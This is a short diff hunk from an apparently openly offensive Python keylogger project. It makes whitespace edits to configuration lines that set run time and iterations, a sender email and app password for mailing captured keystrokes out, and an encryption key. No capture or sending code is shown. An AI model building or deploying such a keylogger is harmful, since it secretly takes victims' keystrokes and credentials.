@@ -37,10 +37,11 @@ time_iteration = 15  #seconds to run keylogger
 number_of_iterations_end = 3  #number of iterations to run keylogger
 
 #add email and password for sending email (will need 2FA Enabled and app password generated (16 digit code)))
-#email_address = #sending email address
+#email_address =  #sending email address
 #password = #email password (16 digit app password)
 
 #toaddr =  #recieving address email
+
 
 #change key below to the key generated from generate key file
 key = " " #from generate key file
